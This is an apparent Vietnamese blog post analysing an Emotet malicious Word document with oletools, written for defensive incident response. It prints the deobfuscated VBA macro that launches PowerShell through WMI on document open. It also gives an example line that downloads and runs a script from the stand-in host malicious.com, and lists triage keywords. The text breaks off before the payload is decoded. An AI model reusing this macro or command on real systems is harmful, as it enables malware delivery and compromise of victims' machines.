@@ -1,0 +1,535 @@
+---
+title: Emotet MalDoc Analysis
+date: '2025-03-27'
+tags: [Technique, malware]
+draft: false
+summary: Malware analysis
+---
+
+![image alt](https://www.goldenfast.net/blog/wp-content/uploads/2020/10/Apa-Itu-Malware.png)
+
+# Introduction
+
+Một trong những vectơ lây nhiễm phổ biến nhất trong an ninh mạng là xâm nhập thông qua các `tài liệu độc hại` đang được gửi qua các `email lừa đảo`. Cụ thể, `tài liệu Microsoft Word` thường được kẻ tấn công sử dụng để che giấu và phát tán mã độc. Các tài liệu độc hại thường chứa một `liên kết` mà người dùng phải nhấp vào và nhập thông tin đăng nhập thông qua một trang web giả mạo hoặc mã độc được nhúng trong chính tài liệu bằng cách sử dụng `Macro`.
+
+Macro được thiết kế để giúp người dùng `tự động hóa và đơn giản hóa` các tác vụ bằng cách sử dụng mã `VBA (Visual Basic for Applications)`. Theo mặc định, người dùng cần chấp nhận việc thực thi macro khi mở tài liệu để tài liệu đó thực thi mã. Tuy nhiên, điều này vẫn không ngăn cản kỹ thuật này trở thành một trong những phương pháp thành công và nguy hiểm nhất hiện có.
+
+**Kĩ thuật MITRE ATT & CK**
+
+[T1566.001 – Lừa đảo: Tệp đính kèm lừa đảo](https://attack.mitre.org/techniques/T1566/001/)
+
+**Mục Tiêu**
+
+Điều tra một mẫu thực tế của tài liệu Word độc hại là một phần của chiến dịch Emotet xuất hiện vào tháng 9 năm 2020 . Emotet là một trong những `trojan phổ biến nhất`, lây nhiễm cho mọi người trong nhiều năm thông qua việc gửi các tài liệu Word được chế tạo độc hại có mã Macro được nhúng để `tải xuống trojan Emotet `khi thực thi. Điều tra maldoc và nhanh chóng có thể trích xuất các chỉ số và hiểu hành vi của nó là rất quan trọng đối với nhiều hoạt động ứng phó sự cố
+
+# Analysis
+
+**Resources** : [abuse.ch](https://bazaar.abuse.ch/sample/be9534491888cff3e8f85a3833a340d076f227ce551084aa2d7b32dff5561a31/)
+
+Xác định `loại tệp` và `metadata`
+
+![Ảnh chụp màn hình 2025-03-20 094532](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_68874c94537fbca63483211e0f10103c.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743069734&Signature=s%2BrtGihPJUPjh5L9V%2BhWKDN6%2FOc%3D)
+
+Output cho chúng ta thấy tiêu đề , tác giả tạo ra file , dấu thời gian . Thấy được loại tệp ở đây là `Composite Document File V2 Document` , có nghĩa là `OLE2` của Microsoft .
+
+OLE ban đầu là từ viết tắt của `Object Linking and Embedding` và là một `định dạng vùng chứa` được Microsoft sử dụng cho các tài liệu `Office` `(docx, xlsx, v.v.)` và thư `Outlook`. Định dạng này cho phép các tệp chứa các `đối tượng được liên kết` hoặc `nhúng` đang được lắp ráp dưới dạng các luồng và lưu trữ riêng lẻ.
+
+Tệp OLE có thể được coi là `một hệ thống tệp nhỏ` hoặc `một kho lưu trữ Zip`: Nó chứa các `luồng dữ liệu` trông giống như các `tệp được nhúng` trong tệp `OLE file`. Mỗi luồng có một tên. Ví dụ, `luồng chính` của MS Tài liệu Word chứa văn bản của nó được đặt tên là "`WordDocument`".
+
+Tệp OLE cũng có thể chứa các `storages`. **Storages** là một thư mục mà chứa các `luồng` hoặc các kho lưu trữ khác. Ví dụ: một tài liệu MS Word với Macro VBA có một bộ nhớ được gọi là "Macros".
+
+Các luồng đặc biệt có thể chứa các `thuộc tính`. Một thuộc tính có thể được sử dụng để lưu trữ thông tin như metadata của tài liệu (tiêu đề, tác giả, ngày tạo, v.v.). Tên luồng thuộc tính thường bắt đầu bằng ký tự '\x05' (mã ASCII 5).
+
+Định dạng này tương tự như một file zip , nên có thể sử dụng một công cụ như `7zip` và trích xuất tài liệu `Word` . Cho ta thấy được toàn bộ cấu trúc và toàn bộ nội dung của chính tài liệu
+
+    ```bash
+    └─$ 7z x mal.doc -omaldoc
+    ```
+
+Marcos là một tập hợp các lệnh tự động hóa trong Office, còn VBA là một ngôn ngữ lập trình đầy đủ, mở rộng khả năng của Macro.
+
+Thư mục `maldoc` sẽ chứa :
+
+- word document structure (WordDocument, Table, Data, Macros, …)
+- macro files (nếu có macro)
+
+`Object Linking and Embedding (OLE) ` là một công nghệ của Microsoft dùng để `nhúng (embed)` hoặc `liên kết (link)` các `object` giữa các ứng dụng. Nó cho phép nhúng nội dung từ một ứng dụng này (ví dụ: Excel, Word) vào một ứng dụng khác mà vẫn duy trì khả năng chỉnh sửa bằng ứng dụng gốc.
+
+- Nhúng một bảng Excel vào tài liệu Word.
+- Nhúng một đối tượng ActiveX (như điều khiển đa phương tiện, nút bấm) vào tài liệu Office.
+
+Trong OLE, `Object (đối tượng)` là `bất kỳ phần tử` nào được `nhúng` hoặc liên kết trong tài liệu. Mỗi object có thể chứa dữ liệu, mã thực thi (macro VBA), hoặc các thuộc tính liên quan.
+
+`Ví dụ `về Object trong OLE:
+
+- Embedded Excel Sheet: Một bảng tính Excel nhúng trong Word.
+- ActiveX Control: Một button hoặc một điều khiển chạy mã lệnh trong VBA.
+- OLE Stream: Một tập tin nhúng trong tài liệu (như hình ảnh, tệp .exe).
+
+Tệp OLE được tổ chức như một `"hệ thống tệp thu nhỏ"`, gồm nhiều `stream` (luồng dữ liệu) chứa các `object`:
+
+Stream trong OLE đề cập đến `cơ chế xử lý đa luồng` trong OLE để quản lý `đối tượng nhúng` và `liên kết`. Nó giúp các ứng dụng xử lý các object OLE một cách độc lập mà không làm chậm ứng dụng chính.
+
+Các loại `Stream` trong OLE
+
+1. Main Stream (luồng chính): Xử lý tài liệu Office (Word, Excel, PowerPoint).
+2. Background Stream (luồng nền): Xử lý cập nhật dữ liệu từ các object OLE liên kết.
+3. Stream for ActiveX Controls: Nếu tài liệu chứa ActiveX, OLE tạo luồng riêng để xử lý nó.
+
+_Khi nhúng một file Excel vào Word, Word sẽ mở một luồng riêng để hiển thị nội dung Excel._
+
+```
+mal.doc (Tệp OLE chính)
+├── SummaryInformation (Metadata tài liệu)
+├── DocumentSummaryInformation (Metadata nâng cao)
+├── WordDocument (Nội dung chính của tài liệu)
+├── Macros (Storage chứa Macro VBA)
+│   ├── VBA (Storage chứa mã VBA)
+│   │   ├── _VBA_PROJECT (Stream chính của macro)
+│   │   ├── Module1 (Mã VBA trong module 1)
+│   │   ├── Module2 (Mã VBA trong module 2)
+│   │   ├── dir (Thông tin thư mục VBA)
+│   ├── PROJECT (Cấu hình macro)
+│   ├── PROJECTwm (Thông tin bổ sung)
+├── ObjectPool (Storage chứa các đối tượng OLE nhúng)
+│   ├── Obj_1 (Embedded Excel Sheet)
+│   ├── Obj_2 (ActiveX Control)
+```
+
+_Storage giống với thư mục còn Stream thì giống với file_
+
+![image alt](https://bluecapesecurity.com/wp-content/uploads/2021/08/Screen-Shot-2021-08-18-at-9.15.22-PM.png)
+
+Cấu trúc này cho chúng ta một` ý tưởng khá tốt` về nội dung của nó và chúng ta có thể thấy rằng có `một thư mục Macros` với các `đối tượng được đặt tên kỳ lạ`, trong số những thứ khác. Lưu ý rằng các tệp đầu ra vẫn chưa được giải mã và sẽ chỉ hiển thị vô nghĩa khi mở chúng bằng trình soạn thảo văn bản. Đây là nơi chúng ta cần sử dụng các công cụ như tiện ích "`strings`" có thể giải mã văn bản có trong các tệp nhị phân.
+
+![image alt](https://olefile.readthedocs.io/en/latest/_images/OLE_VBA_sample.png)
+
+**Kiểm tra tài liệu**
+
+Điều này thường giúp có được ý tưởng chung và xem liệu có các từ khóa đáng ngờ hay không, chẳng hạn như "`powershell`", "`wmic`", "`webclient`", v.v., có thể được sử dụng để thực thi và / hoặc tải xuống các tải trọng bổ sung
+
+```
+strings maldoc.doc | more
+```
+
+![Ảnh chụp màn hình 2025-03-20 164332](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_e11e767703267f95e8951d6b0673b870.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743069789&Signature=4vkTLKapJPuiv%2F5zP7XukBZO9uU%3D)
+
+Ở đầu tài liệu, có một chuỗi rất dài dường như là một loại mẫu nào đó.Trong mẫu này, chúng ta chưa thể biết nó là gì, nhưng trong các trường hợp khác, đây có thể là tải trọng được mã hóa `base64` ngay tại đó
+
+**Sử dụng oletools để kiểm tra và trích xuất nội dung**
+
+Có một số oletools để phân tích cấu trúc của tài liệu:
+
+- `olebrowse`: Một GUI đơn giản để duyệt các tệp OLE (ví dụ: tài liệu MS Word, Excel, Powerpoint), để xem và trích xuất các luồng dữ liệu riêng lẻ.
+- `olemeta`: để trích xuất tất cả các thuộc tính tiêu chuẩn (siêu dữ liệu) từ các tệp OLE.
+- `oletimes`: để trích xuất dấu thời gian tạo và sửa đổi của tất cả các luồng và lưu trữ.
+- `oledir`: để hiển thị tất cả các mục thư mục của tệp OLE, bao gồm các mục tự do và mồ côi.
+- `olemap`: để hiển thị bản đồ của tất cả các khu vực trong tệp OLE.
+
+Sử dụng `oledir` để có cái nhìn tổng quan về cấu trúc của tài liệu và kích thước stream
+
+```
+oledir maldoc.docx
+```
+
+![Ảnh chụp màn hình 2025-03-20 170045](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_cb22916bf9a2b3edf889f62812ff97c6.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743069835&Signature=%2BCbxoGrfcR7MlhpEiEenly%2BpI4U%3D)
+
+![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_12a448151e0e2cfb3f2728c2d49849fc.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743069862&Signature=KKwnHOnxD%2Bb%2Ffce9spNCAz5ukUU%3D)
+
+**Bkc5re_xxwma**
+Đây là một `Storage` có tên ngẫu nhiên . Chứa 2 stream con là `f` và `o` , chỉ ra đây là một `form object` . Trong tài liệu Office, Form Object có thể được dùng để lưu trữ chuỗi ẩn, biến môi trường hoặc mã độc.Lần xuất hiện `thứ hai `cho biết` luồng mã VBA` có kích thước đáng kể.
+
+**f (Form Data)**: Chứa thông tin về bố cục biểu mẫu hoặc dữ liệu ẩn.
+**o (Object Data)**: Chứa dữ liệu nhị phân của đối tượng (ví dụ: ActiveX, hình ảnh, hoặc dữ liệu mã hóa).
+
+**Hacker có thể lợi dụng Form Object để giấu payload hoặc tải xuống mã độc khác.**
+
+📌 **Bkc5re_xxwma (24200 bytes)**
+
+- Chứa mã VBA chính, có thể chứa payload độc hại.
+- Rất có thể chứa code thực thi PowerShell, Shellcode hoặc tải mã độc từ internet.
+
+**S88ecjif1ml6** : Là một `stream` được đặt tên ngẫu nhiên khác trong VBA Macro . Chắc chắn cũng rất đáng ngờ . Kích thước nhỏ nhưng đáng ngờ, có thể là một đoạn mã độc giúp thực thi mã chính.
+
+Cần kiểm tra nội dung để xem nó có chứa lệnh **AutoOpen()** hay **Document_Open()** không.
+
+**WordDocument**
+Stream chứa nội dung chính của tài liệu Word
+
+Một số `oletools` để phân tích nội dung độc hại của tài liệu
+
+- **oleid**: để phân tích các tệp OLE để phát hiện các đặc điểm cụ thể thường thấy trong các tệp độc hại.
+- **olevba**: để trích xuất và phân tích mã nguồn VBA Macro từ các tài liệu MS Office (OLE và OpenXML).
+- **MacroRaptor**: để phát hiện Macro VBA độc hại
+- **msodde**: để phát hiện và trích xuất các liên kết DDE/DDEAUTO từ tài liệu MS Office, RTF và CSV\*
+- **pyxswf**: để phát hiện, trích xuất và phân tích các đối tượng Flash (SWF) có thể được nhúng trong các tệp như tài liệu MS Office (ví dụ: Word, Excel) và RTF, đặc biệt hữu ích cho việc phân tích phần mềm độc hại.
+- **oleobj**: để trích xuất các đối tượng được nhúng từ các tệp OLE.
+- **rtfobj**: để trích xuất các đối tượng được nhúng từ các tệp RTF.
+
+Sử dụng `oleid` để quét tệp tìm bất kỳ đặc điểm độc hại nào
+
+```
+oleid mal.doc
+```
+
+![Ảnh chụp màn hình 2025-03-20 173222](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_726929d24ff9bd4d126d4587cc18f66b.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743069936&Signature=3CEI%2FmGm8vALxoFcXGYApIKsd50%3D)
+
+`oleid` có thể phát hiện ra rằng các `Macro` được `nhúng` trong tài liệu chứa các `từ khóa` đáng ngờ.
+
+**olevba** là một công cụ trong oletools, chuyên dùng để **trích xuất** và **phân tích** mã VBA Macro từ các tài liệu Microsoft Office như .doc, .xls, .ppt.
+Ngoài việc in ra mã nguồn VBA, olevba còn có khả năng:
+✅ Phát hiện hành vi đáng ngờ (macro chạy mã độc, gọi Windows API).
+✅ Giải mã các chuỗi bị obfuscate (mã hóa, XOR, Base64, hex encoding).
+✅ Tìm kiếm IOC (Indicators of Compromise) như URL độc hại, lệnh PowerShell, shellcode.
+
+```
+olevba mal.doc
+```
+
+Đầu ra chứa 2 VBA Macro , với hàng ngàn câu lệnh
+
+![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_ed4e33b9c1f61ce3217160486415013a.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743069962&Signature=3wfMaWjNpIoI1rNzuKVDHM8gxDE%3D)
+
+Thoạt nhìn, chúng ta có thể thấy rằng mã cho cả Macro VBA "`S88ecjif1ml6`" và "`Bkc5re_xxwma`" khá khó hiểu. Nó bao gồm nhiều function và hàm biến ngẫu nhiên có lẽ `không quá hữu ích`
+
+```
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Ny3av00ll97ltoy
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Wmyd37gtxrphjkb
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Tahoma;
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Fskdm2zvwtdesh
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Tahoma�
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Gg6xs1_7x7ja
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Urer04ndu5q_jgnt0'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'Ny3av00ll97ltoy'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'G9296_zlvb28jru8'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'Wmyd37gtxrphjkb'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'M3sl9apgyan8k'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'P'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Vo_3ycaurbu'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'Fskdm2zvwtdesh'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Ptvl917_3fhv4ghbhb'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'tar'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Ct8nqi_rrjku1h0h'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+None
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'Ys_jgil82mmhf'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'tu'
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'E8qursw9anoz'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'Gg6xs1_7x7j'
+```
+
+Chúng ta cũng đã thấy trước đó rằng OLE bao gồm một đối tượng `Form`. "olevba" đã có thể trích xuất một `số chuỗi` và `biến` liên quan đến biểu mẫu. Điều này được biểu thị bằng các dòng "`VBA FORM STRING IN`" và "`VBA FORM Variable`".
+
+`olevba` cũng cho chũng ta một bản tóm tắt nhỏ phát hiện ở cuối dựa trên các đặc điểm phát hiện của nó .
+
+![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_8c6dac60562c554e46ced4a52a321902.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743069997&Signature=K3XGDm3KhR7VyTLG07IjZn4Nqn4%3D)
+
+Ở đây chúng ta có thể thấy rằng Macro `tự động thực thi khi tài liệu được mở`. Hơn nữa, có một số từ khóa đáng ngờ thường được sử dụng bởi các tài liệu độc hại. Cụ thể, thuật ngữ "`Create`" rất thú vị, vì nó thường được liên kết với việc tạo một quy trình mới bằng `WMI`. Các từ khóa khác có thể được liên kết với xử lý đối tượng và mã hóa chuỗi và xáo trộn.
+
+**WMI (Windows Management Instrumentation)** là một **framework** của Windows, cho phép **quản lý** và **giám sát hệ thống** thông qua tập lệnh hoặc lập trình.
+
+✅ Thực thi lệnh hệ thống từ xa hoặc cục bộ (ví dụ: khởi động/quản lý tiến trình).
+✅ Thu thập thông tin hệ thống (phiên bản Windows, danh sách tiến trình, trạng thái dịch vụ).
+✅ Tương tác với Registry, Event Logs, dịch vụ Windows.
+
+Một ví dụ về `WMI` tạo ra process và download một tệp độc hại
+
+```
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Set objProcess = objWMIService.Get("Win32_Process")
+objProcess.Create "cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"
+```
+
+1️⃣ GetObject("winmgmts:\\.\root\cimv2") → Kết nối với WMI.
+
+2️⃣ objProcess.Create → Tạo tiến trình mới bằng WMI.
+
+3️⃣ Chạy PowerShell ngầm, tải xuống và thực thi mã độc từ Internet.
+
+# Emotet VBA Code Analysis
+
+Chúng ta cần xuất mã để phân tích thêm
+
+```
+olevba maldoc.doc > olevba.txt
+```
+
+![image](https://hackmd-prod-images.s3-ap-northeast-1.amazonaws.com/uploads/upload_2dcc8c31ab24674687ebfbdd9be23717.png?AWSAccessKeyId=AKIA3XSAAW6AWSKNINWO&Expires=1743070023&Signature=TSlrJRpDDOYEpcDOVYhJ2G6spEU%3D)
+
+Mã rõ ràng bị `xáo trộn rất nhiều`. Chúng ta sẽ cần bắt đầu loại bỏ rất nhiều `mã rác` lặp đi lặp lại để có thể chỉ tập trung vào các dòng có liên quan. Chúng ta sẽ xem xét điều này tập trung vào từng chức năng một cách riêng biệt
+
+## Phân tích VBA MACRO S88ecjif1ml6
+
+```
+-------------------------------------------------------------------------------
+VBA MACRO S88ecjif1ml6
+in file: mal.doc - OLE stream: 'S88ecjif1ml6'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Private Sub Document_open()
+Wdggt43espeaai75g_ = Array(Tku0cz3_kk0tufj + "Vi4gxn59xnxkzzm15Rxleer34r5t8v Tobvo57prwmzbrlw9" + Skrxs1elp57_o, U3tlx2laojf13ppk, Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz, W8khkof7lrcpbtr + "P7k0a_g9z8ir Y17elacettooplkjw Szsgtfms72msn Rdn3hl2todcn")
+End Sub
+```
+
+Chúng ta có một phương thức `Document_open` , là điểm khởi đầu để mã thực thi . Có một tham chiếu đến function `Bkc5re_xxwma.Xy1ql8qq3m9fwoxvz` , đây là sẽ nơi ta phân tích tiếp theo
+
+## Phân tích VBA MACRO Bkc5re_xxwma
+
+Hàm có 4 function chính . Các mẫu mã rác lặp lại một cách vô nghĩa , gán biến nhưng không bao giờ được gọi . Mã chứa nhiều đoạn code có chứa hàm `mid()`
+
+`Mid(A, B, 1)`: **Lấy 1 ký tự từ chuỗi A bắt đầu từ vị trí B**.
+
+Làm sạch mã bằng cách sử dụng biểu thức chính quy (Regex)
+
+```
+.*Mid\(.*\)
+```
+
+`.*` : Khớp với bất kỳ ký tự nào (ngoại trừ xuống dòng).
+`Mid\(` : Tìm từ `Mid(`, dấu `\(` dùng để `thoát` `ký tự (`.
+`.*\) `: Khớp với bất kỳ nội dung nào sau `Mid( `và kết thúc bằng `)`.
+
+Tiếp tục làm sạch code bằng cách loại bỏ một tập hợp các dòng ngẫu nhiên khác . Các dòng này vô nghĩa và lặp đi lặp lại
+
+```
+   Set mnnlkNhuiqgbjkas = ProtectedViewWindows
+BrjMGGrzYB = TGTnmafMf + KQXpqbBVXw + lRzndUz + DZYRouLDX + CRfUmzi + BakDlhW
+nVFWYX = BrjMGGrzYB + ADuSUmc + mJojcpUfH + PVCpqKY + YjJajajJSM
+wMGGAO = nVFWYX + suITCfBFc
+```
+
+Mã bây giờ đã giảm đáng kể đi nhiều
+
+```
+Function Xy1ql8qq3m9fwoxvz()
+On Error Resume Next
+Fycmwxxdr9u2jm = 12
+Hguzrzdi3qzkaorc4 = Jpyqbcmwe05t03m + Chr$(Fycmwxxdr9u2jm + (103))
+G6_e19me06ggh9 = ", A :, A :w, A :i, A :nm, A :, A :gm, A :t, A :, A :" + Hguzrzdi3qzkaorc4 + ", A :, A ::, A :w, A :in, A :, A :3, A :2, A :_, A :" + Bkc5re_xxwma.M3sl9apgyan8k + ", A :ro, A :, A :ce, A :s, A :s, A :"
+Rbgd8kh364erl = Jc1yuw7r38_4a5(G6_e19me06ggh9)
+Set Ioyv20u9cnhfyah = CreateObject(Rbgd8kh364erl)
+Ivvt_2x4qmasd8 = Q0cawbk07t3 + Rbgd8kh364erl + Hguzrzdi3qzkaorc4 + Bkc5re_xxwma.Ptvl917_3fhv4ghbhb + Bkc5re_xxwma.Ys_jgil82mmhf
+Set Mmxw9h87r6ne0q_n5 = Jgcwzg_v1lujky5(Ivvt_2x4qmasd8 + Bkc5re_xxwma.M3sl9apgyan8k)
+Ioyv20u9cnhfyah.Create Dlhbagxwt5vvo7ur, Crdajectd75a_ze, Mmxw9h87r6ne0q_n5
+End Function
+Function Jgcwzg_v1lujky5(Aat9psb6y4z_4fy)
+On Error Resume Next
+Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
+Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
+Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
+Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
+Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
+Set Jgcwzg_v1lujky5 = GetObject(Aat9psb6y4z_4fy)
+Jgcwzg_v1lujky5. _
+showwindow = wdKeyEquals - wdKeyEquals
+End Function
+Function Jc1yuw7r38_4a5(Brqcqtzjby3rhyk)
+On Error Resume Next
+Rkkl4izp8yq037 = CleanString(Brqcqtzjby3rhyk)
+Lhene6fi97ra = Split(Rkkl4izp8yq037, ", A :")
+Ox239biw5eyqve87i = Qd3ue1zobs9 + Join(Lhene6fi97ra, D1vtk4ty75k5z)
+Jc1yuw7r38_4a5 = Ox239biw5eyqve87i
+End Function
+Function Dlhbagxwt5vvo7ur()
+On Error Resume Next
+O0hx59lf0mc51 = "POW" + "eR" + "sHe"
+Bg6i7gcz1j38udj0 = S88ecjif1ml6.Content.Text
+Ah_ap6yelik = Right(Bg6i7gcz1j38udj0, Len(Bg6i7gcz1j38udj0) - 1)
+Dlhbagxwt5vvo7ur = Jc1yuw7r38_4a5(O0hx59lf0mc51 + Ah_ap6yelik)
+End Function
+```
+
+Tuy nhiên, khi chúng ta nhìn vào các biến, ví dụ như `Bkc5re_xxwma. M3sl9apgyan8k` nó không tồn tại trong hàm hiện tại. Tuy nhiên, một số trong số chúng xuất hiện trong `form` . Đây là nơi những kẻ tấn công cất giữ một vài mảnh ghép
+
+```
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'M3sl9apgyan8k'" IN 'mal.doc' - OLE stream: 'Macros/Bkc5re_xxwma'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+b'P'
+-------------------------------------------------------------------------------
+```
+
+`b'M3sl9apgyan8k'` : Đây là một biến của Form trong VBA, được trích xuất từ tài liệu `mal.doc`. Mang giá trị là `P`
+
+Tập lệnh này nối các chuỗi và chuyển chúng đến hàm `Jc1yuw7r38_4a5`
+
+```
+Fycmwxxdr9u2jm = 12
+Hguzrzdi3qzkaorc4 = Jpyqbcmwe05t03m + Chr$(Fycmwxxdr9u2jm + (103))
+G6_e19me06ggh9 = ", A :, A :w, A :i, A :nm, A :, A :gm, A :t, A :, A :" + Hguzrzdi3qzkaorc4 + ", A :, A ::, A :w, A :in, A :, A :3, A :2, A :_, A :" + Bkc5re_xxwma.M3sl9apgyan8k + ", A :ro, A :, A :ce, A :s, A :s, A :"
+Rbgd8kh364erl = Jc1yuw7r38_4a5(G6_e19me06ggh9)
+```
+
+Tất cả những gì điều này thực sự làm là lấy ký tự `115 (12 +103)`, là chữ "s" trong bộ ký tự ASCII và gán nó cho một biến sau đó được sử dụng trong chuỗi nối sau . Chuỗi này sau đó được chuyển vào hàm `Jc1yuw7r38_4a5`, tất cả những gì nó làm là một hàm phân tách để `loại bỏ chuỗi ", A :"`, xuất hiện rất nhiều trong chuỗi được hiển thị ở trên.
+
+```
+Function Jc1yuw7r38_4a5(Brqcqtzjby3rhyk)
+On Error Resume Next
+Rkkl4izp8yq037 = CleanString(Brqcqtzjby3rhyk)
+Lhene6fi97ra = Split(Rkkl4izp8yq037, ", A :")   'tách chuỗi thành mảng các chuỗi con, mỗi chuỗi con được tách bởi chuỗi ", A :"
+Ox239biw5eyqve87i = Qd3ue1zobs9 + Join(Lhene6fi97ra, D1vtk4ty75k5z)  'nối các chuỗi con thành một chuỗi mới, mỗi chuỗi con được nối bởi chuỗi D1vtk4ty75k5z'
+Jc1yuw7r38_4a5 = Ox239biw5eyqve87i
+End Function
+```
+
+Chuỗi sau khi phân tách
+
+```
+G6_e19me06ggh9 = "winmgmt" + "s" + ":win32_" + "p" + "rocess"
+```
+
+Nó lắp ráp chuỗi để có được đối tượng `winmgmts:win32_process`, được sử dụng để `tạo một quy trình mới`. Sau khi thay thế một số biến đó, các dòng sau có thể trông như sau:
+
+```
+Set Ioyv20u9cnhfyah = CreateObject("winmgmts:win32_process")
+Ivvt_2x4qmasd8 = Q0cawbk07t3 + "winmgmts:win32_process" + "s" + "tar" + "tu"
+Set Mmxw9h87r6ne0q_n5 = Jgcwzg_v1lujky5("winmgmts:win32_process" + "s" + "tar" + "tu" + "p")
+Ioyv20u9cnhfyah.Create Dlhbagxwt5vvo7ur, Crdajectd75a_ze, Mmxw9h87r6ne0q_n5
+```
+
+Một đối tượng `win32_process` được tạo ra , sau đó là 2 dòng không làm gì cả , dòng cuối cùng là nơi thực hiện malicous . Phương thức `Create` của `win32_process` được gọi . Bây giờ chỉ cần tìm `Dlhbagxwt5vvo7ur` được truyền vào là gì . Đây là một tham chiếu đến một function ở bên dưới
+
+```
+Function Dlhbagxwt5vvo7ur()
+On Error Resume Next
+O0hx59lf0mc51 = "POW" + "eR" + "sHe"
+Bg6i7gcz1j38udj0 = S88ecjif1ml6.Content.Text
+Ah_ap6yelik = Right(Bg6i7gcz1j38udj0, Len(Bg6i7gcz1j38udj0) - 1)
+Dlhbagxwt5vvo7ur = Jc1yuw7r38_4a5(O0hx59lf0mc51 + Ah_ap6yelik)
+End Function
+```
+
+Chúng ta đã có thể thấy rằng chuỗi `"POWeRsHe"` đang được nối . Nối với nội dung từ biến `S88ecjif1ml6.Content.Text` sau đó truyền vào hàm `Jc1yuw7r38_4a5` nơi loại bỏ các mẫu chứa chuỗi `", A:"`
+
+Mục đích của toàn bộ mã VBA là `thực thi PowerShell`, nhưng chúng ta vẫn cần tìm `payload` của mình. Cho đến nay, những gì chúng ta có là:
+
+```
+CreateObject("winmgmts:win32_process").Create POWeRsHe + S88ecjif1ml6.Content.Text
+```
+
+## Giải mã payload
+
+Biến `S88ecjif1ml6.Content.Text` về cơ bản bao gồm `nội dung từ tài liệu Word`. Ta có thể mở tài liệu để truy xuất văn bản, nhưng ta cũng nhớ rằng trước đó ta đã thấy một chuỗi rất dài với một mẫu đáng ngờ.
+
+```
+strings -n 400 maldoc.doc > contents.txt
+```
+
+```
